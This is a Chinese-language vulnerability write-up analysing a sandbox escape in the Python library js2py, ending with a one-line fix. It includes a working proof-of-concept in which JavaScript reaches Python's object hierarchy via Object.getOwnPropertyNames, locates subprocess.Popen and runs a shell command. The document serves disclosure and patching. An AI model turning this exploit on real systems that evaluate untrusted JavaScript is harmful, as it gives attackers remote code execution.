## 前言

js2py是一个爬虫常用的python库，用来在python原生环境中解析并执行js代码，爬虫一般会用js2py来解析从网上爬取的js代码，从而模拟浏览器环境。

但是js2py有一个对于爬虫来说极其危险的功能：它支持在js中导入并使用python包，也就是说js2py允许js代码操控各个python库，直接和python环境交互。正是因此，我们可以使用类似Jinja SSTI的方式，在js2py环境中用一个python对象找到`subprocess.Popen`类，实现RCE.

而且js2py作为一个python2时代的，应用广泛且年久失修的包，想必分析起来也是相对容易的。

## 分析代码

### JS代码转Python代码部分

一通下断点后可以找到js代码实际被解析的地方为`host/jseval.py`的`Eval`函数，在其中下断点就可以看到js2py转换后的python代码。

比如说这段js代码

```js
let a = 114
console.log(a)
```

最后会被解析成这段python代码

```python
var.registers(['a'])
var.put('a', Js(114.0))
EVAL_RESULT = (var.get('console').callprop('log', var.get('a')))
```

可以看到js层的变量都储存在`var`这个python变量中，所有js层的值都干干净净地储存为`PyJs`类（这里的`Js`实际上是一个函数，后面讲），函数也是通过`callprop`进行调用，在正常情况下js代码是无法接触到python对象的。

这里在看代码的时候注意到作者很喜欢用字符串拼接来构造最终的python代码，就想着是不是可以通过构造js代码生成非法的python代码，从而实现构造任意python代码并执行，但是考虑到这条路比后面的这条路要难得多，就没有继续深挖。

### Python数据转JS数据部分

为了拿到python对象并实现RCE，首先要看的当然是Python对象是如何转换成`PyJs`对象的

首先找到`Js`函数的实现，在`base.py`里。`Js`函数的作用是将传入的python值转换成对应的`PyJs`值，从而允许js代码操控这些值

```python
def Js(val, Clamped=False):
    '''Converts Py type to PyJs type'''
    if isinstance(val, PyJs):
        return val
    elif val is None:
        return undefined
    elif isinstance(val, basestring):
        return PyJsString(val, StringPrototype)
    elif isinstance(val, bool):
        return true if val else false
    elif isinstance(val, float) or isinstance(val, int) or isinstance(
            val, long) or (NUMPY_AVAILABLE and isinstance(
                val,
                (numpy.int8, numpy.uint8, numpy.int16, numpy.uint16,
                 numpy.int32, numpy.uint32, numpy.float32, numpy.float64))):
        # This is supposed to speed things up. may not be the case
        if val in NUM_BANK:
            return NUM_BANK[val]
        return PyJsNumber(float(val), NumberPrototype)
    ... # 此处省略若干代码
    else:  # try to convert to js object
        return py_wrap(val)
```

可以看到bool, float, list等python的基础数据结构会转换成专门的`PyJs`类，而其他类型的数据会由py_wrap处理，最终变成`PyObjectWrapper`类

普通的`PyJs`类代表的是数字、布尔等普通的数据，而`PyObjectWrapper`代表的是python模块等特殊数据，所以我们只要拿到一个`PyObjectWrapper`类型的数据，就可以使用类似Jinja SSTI的方式依靠取属性实现RCE。

一般来说`PyObjectWrapper`类型的数据只有在开启了导入python包的功能后才能利用python包拿到，但因为`js2py`年久失修，没有认真考虑python2和python3的差异，最终导致了沙盒逃逸漏洞的产生。

插一条题外话，在看`PyJs`的实现时看到作者写了这么几行代码：

```python
if six.PY3:
    PyJs.__hash__ = PyJs._fuck_python3
    PyJs.__truediv__ = PyJs.__div__
```

可以说作者是非常讨厌python3的了

### JS功能实现部分

`js2py`在提供js代码转python代码功能的同时，也提供了`console`, `Object`等多个内置对象用于支持正常的js代码运行。

我们的最终目标是绕过pyimport的限制拿到`PyObjectWrapper`对象。从上面的分析中可以看出，为了无中生有地拿到`PyObjectWrapper`对象，我们只能从内置对象的实现入手，从其中拿出`PyObjectWrapper`对象。

开始扫内置对象的实现代码，从`constructors/jsobject.py`中可以看到`Object`对象中各个函数的实现，其中有`Object.keys`等常用函数。

然后就可以从其中看到这个函数：

```python
    def getOwnPropertyNames(obj):
        if not obj.is_object():
            raise MakeError(
                'TypeError',
                'Object.getOwnPropertyDescriptor called on non-object')
        return obj.own.keys()
```

`js2py`用dict来表示js中的对象，这里的`keys()`调用的是python字典的`keys()`。学过python的应该都知道，在python2中这个函数会返回一个列表，而在python3中会返回一个`dict_keys` view，而根据上面`Js`函数的实现，这个`dict_keys`会被转换成`PyObjectWrapper`，我们也就可以以此实现RCE

## 实现RCE

首先验证`getOwnPropertyNames`是不是可以拿到`PyObjectWrapper`

```python
import js2py

code = """
let a = Object.getOwnPropertyNames({})
console.log(a)
"""

js2py.eval_js(code)
```

打印了`PyObjectWrapper(dict_keys([]))`，当然是可以的

然后根据这个对象拿到`__getattribute__`函数，就可以轻松地实现RCE了。当时写PoC的时候想得太复杂了，实际上只要使用`__class__.__base__`就可以拿到`__getattribute__`函数。

然后根据`__getattribute__`函数拿到object对象，再写一个递归函数就可以找到任意模块的任意类了，这里为了RCE找的是`subprocess.Popen`

新PoC如下：

```python
import js2py

code = """
let cmd = "id"
let a = Object.getOwnPropertyNames({}).__class__.__base__.__getattribute__
let obj = a(a(a,"__class__"), "__base__")
function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}
let result = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(result)
result
"""

js2py.eval_js(code)
```

## 修复

既然知道问题出在`getOwnPropertyNames`函数里，那就把它返回的`dict_keys`转换成普通的列表就好了。

